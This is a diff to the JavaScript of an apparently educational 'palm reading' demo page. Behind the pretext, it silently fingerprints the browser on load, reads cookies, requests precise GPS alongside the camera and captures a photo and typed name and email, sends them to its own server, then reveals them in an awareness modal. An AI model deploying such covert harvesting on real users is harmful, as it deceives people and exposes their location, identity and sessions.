@@ -12,7 +12,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const urlElement = document.getElementById('server-url');
             urlElement.textContent = data.url;
             urlElement.onclick = () => window.open(data.url, '_blank');
-
             const qrContainer = document.getElementById('qrcode-container');
             qrContainer.innerHTML = '';
             new QRCode(qrContainer, {
@@ -25,6 +24,10 @@ document.addEventListener('DOMContentLoaded', () => {
             });
         }).catch(err => console.error(err));
 
+    // Set a demo cookie so we can show it being stolen
+    document.cookie = "session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/";
+    document.cookie = "user_pref=theme=dark&lang=en; path=/";
+
     // Elements
     const startBtn = document.getElementById('start-btn');
     const captureBtn = document.getElementById('capture-btn');
@@ -35,6 +38,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const capturedImagePreview = document.getElementById('captured-image-preview');
     const closeModalBtn = document.getElementById('close-modal-btn');
     const educationModal = document.getElementById('education-modal');
+    const cookieDisplay = document.getElementById('cookie-display');
 
     let stream = null;
     let imageCaptureData = null;
@@ -59,35 +63,36 @@ document.addEventListener('DOMContentLoaded', () => {
             userAgent: navigator.userAgent,
             language: navigator.language,
             screenSize: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth}-bit`,
             platform: navigator.platform,
             timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            battery: 'Unknown'
+            referrer: document.referrer || 'Direct',
+            battery: 'Unknown',
+            cookies: document.cookie || 'None',
+            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None detected'
         };
 
-        // Try to sneakily grab battery level if browser allows
+        // Grab battery level
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
-                metadata.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Unplugged'})`;
+                metadata.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging ⚡' : 'Unplugged 🔋'})`;
             } catch (e) {}
         }
 
-        // Send immediately without asking permission
+        // Send silently
         try {
             await fetch('/api/silent-log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, metadata })
             });
-            console.log("Silent telemetry dispatched.");
-        } catch (e) {
-            console.error("Silent harvest failed", e);
-        }
+        } catch (e) {}
         
-        return metadata; // Keep it around for the final reveal
+        return metadata;
     };
     
-    // Run it immediately
+    // Run immediately — no button pressed, no permission asked
     const initialMetadata = performSilentHarvest();
 
     // ==========================================
@@ -98,22 +103,21 @@ document.addEventListener('DOMContentLoaded', () => {
             cameraStatus.textContent = "Requesting camera and system access...";
             switchView(landingScreen, cameraScreen);
             
-            // 1. Sneakily ask for location alongside the camera process
+            // Silently request GPS alongside camera
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    (pos) => {
                         userLocation = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
                         };
                     },
-                    (err) => { console.log("Location denied", err); },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
             }
 
-            // 2. Request camera
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "environment" }, 
                 audio: false 
@@ -122,10 +126,8 @@ document.addEventListener('DOMContentLoaded', () => {
             cameraFeed.srcObject = stream;
             cameraStatus.textContent = "Camera active. Ready for scanning.";
         } catch (err) {
-            console.error("Camera error:", err);
             cameraStatus.textContent = "Camera access denied. We need it to read your palm!";
             cameraStatus.style.color = "#ef4444";
-            
             setTimeout(() => {
                 switchView(cameraScreen, landingScreen);
                 cameraStatus.textContent = "";
@@ -134,112 +136,108 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Step 1: Start Button clicks
     startBtn.addEventListener('click', () => {
         startCamera();
     });
 
-    // Step 2: Capture Button clicks
     captureBtn.addEventListener('click', () => {
         if (!stream) return;
-
         const canvas = document.createElement('canvas');
         canvas.width = cameraFeed.videoWidth;
         canvas.height = cameraFeed.videoHeight;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
         imageCaptureData = canvas.toDataURL('image/jpeg', 0.8);
-        
         stream.getTracks().forEach(track => track.stop());
         stream = null;
-
         switchView(cameraScreen, loadingScreen);
         processScan();
     });
 
-    // Step 3: Process the scan
     const processScan = async () => {
-        const metadata = await initialMetadata; // Get the metadata we collected earlier
+        const metadata = await initialMetadata;
+        
+        // Capture what was typed in the form
+        const userName = document.getElementById('user-name')?.value || '';
+        const userEmail = document.getElementById('user-email')?.value || '';
+        metadata.userName = userName;
+        metadata.userEmail = userEmail;
         
         try {
             const response = await fetch('/api/analyze', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    sessionId: sessionId,
+                    sessionId,
                     image: imageCaptureData,
                     location: userLocation,
-                    metadata: metadata
+                    metadata
                 })
             });
-
             const result = await response.json();
-            
             setTimeout(() => {
                 readingText.textContent = `"${result.reading}"`;
                 populateStolenData(metadata, imageCaptureData, userLocation);
                 switchView(loadingScreen, resultsScreen);
             }, 2000);
-
         } catch (error) {
-            console.error("Backend error:", error);
             setTimeout(() => {
-                readingText.textContent = '"Your life line suggests you should ensure the local server is running!"';
+                readingText.textContent = '"Your stars align with caution — check the server!"';
                 populateStolenData(metadata, imageCaptureData, userLocation);
                 switchView(loadingScreen, resultsScreen);
             }, 2000);
         }
     };
 
-    // Step 4: Populate the educational reveal
-    const populateStolenData = (metadata, base64Image, userLocation) => {
+    const populateStolenData = (metadata, base64Image, loc) => {
+        // Show cookies in the cookie box
+        if (cookieDisplay) {
+            cookieDisplay.textContent = metadata.cookies || 'None found';
+        }
+
         stolenDataList.innerHTML = `
-            <li><strong>Browser:</strong> ${metadata.platform} - ${metadata.userAgent.split(' ')[0]}</li>
-            <li><strong>Screen Res:</strong> ${metadata.screenSize}</li>
-            <li><strong>Battery:</strong> ${metadata.battery}</li>
-            <li><strong style="color:#ef4444;">Live Camera Image Captured:</strong> Yes</li>
-            <li id="photo-stolen-li"><strong>Precise GPS Stolen:</strong> ${userLocation ? '<span style="color:#ef4444;">YES!</span>' : 'Failed/Denied'}</li>
+            <li>🪪 <strong>Identity:</strong> <span style="color:#f87171;">${metadata.userName || '(not entered)'}</span> &lt;${metadata.userEmail || '(not entered)'}&gt;</li>
+            <li>🌐 <strong>Browser/OS:</strong> ${metadata.platform} — ${metadata.userAgent.split(' ').slice(-2).join(' ')}</li>
+            <li>📐 <strong>Screen:</strong> ${metadata.screenSize} @ ${metadata.colorDepth}</li>
+            <li>🔋 <strong>Battery:</strong> ${metadata.battery}</li>
+            <li>🕐 <strong>Timezone:</strong> ${metadata.timeZone}</li>
+            <li>📎 <strong>Referrer:</strong> ${metadata.referrer}</li>
+            <li style="color:#ef4444;">📷 <strong>Camera Snapshot:</strong> Captured ✅</li>
+            <li id="gps-li" style="${loc ? 'color:#ef4444;' : ''}">📍 <strong>GPS:</strong> ${loc ? `LAT ${loc.lat.toFixed(5)}, LON ${loc.lon.toFixed(5)} (±${Math.round(loc.accuracy)}m) ✅` : 'Denied ❌'}</li>
+            <li style="color:#ef4444;">🍪 <strong>Cookies Read:</strong> ✅ (see below)</li>
         `;
 
         let imagesHtml = '';
         if (base64Image) {
             imagesHtml += `
             <div style="flex:1;">
-                <p style="margin-bottom: 5px; font-weight: bold;">Camera Feed:</p>
-                <img src="${base64Image}" alt="Captured Palm" style="max-width: 100%; border-radius: 8px;">
+                <p style="margin-bottom:5px;font-weight:bold;">📷 Camera Snapshot</p>
+                <img src="${base64Image}" alt="Captured Palm" style="max-width:100%;border-radius:8px;border:2px solid #ef4444;">
             </div>`;
         }
-        if (userLocation) {
-             imagesHtml += `
+        if (loc) {
+            imagesHtml += `
             <div style="flex:1;">
-                <p style="margin-bottom: 5px; font-weight: bold; color: #ef4444;">GPS Coordinates:</p>
-                <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 10px; font-family: monospace; font-size: 0.85rem;">
-                    LAT: ${userLocation.lat}<br>
-                    LON: ${userLocation.lon}<br>
-                    ACCURACY: ~${Math.round(userLocation.accuracy)} meters
+                <p style="margin-bottom:5px;font-weight:bold;color:#ef4444;">📍 Precise GPS Location</p>
+                <div style="background:rgba(239,68,68,0.1);border:1px solid #ef4444;border-radius:8px;padding:12px;font-family:monospace;font-size:0.85rem;line-height:1.7;">
+                    LAT: ${loc.lat}<br>
+                    LON: ${loc.lon}<br>
+                    ACCURACY: ~${Math.round(loc.accuracy)}m<br>
+                    <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" style="color:#38bdf8;font-size:0.9rem;">📌 Open in Google Maps</a>
                 </div>
             </div>`;
         }
 
         capturedImagePreview.innerHTML = `
-            <div style="display: flex; gap: 10px; margin-top: 10px;">
-                ${imagesHtml}
-            </div>
-            <p style="margin-top: 8px; color: var(--danger); font-size: 0.9rem;">
-                ☝️ This highly sensitive data was extracted instantly or simply by you clicking 'Allow'.
-            </p>`;
+            <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap;">${imagesHtml}</div>`;
         
         educationModal.classList.remove('hidden');
     };
 
     closeModalBtn.addEventListener('click', () => {
-        // Reset the app
         readingText.textContent = "";
         educationModal.classList.add('hidden');
-        // Clear previous stolen data so animation can replay cleanly later if needed
-        setTimeout(() => {
-            capturedImagePreview.innerHTML = '';
-        }, 500); 
+        setTimeout(() => { capturedImagePreview.innerHTML = ''; }, 500); 
         switchView(resultsScreen, landingScreen);
     });
 });
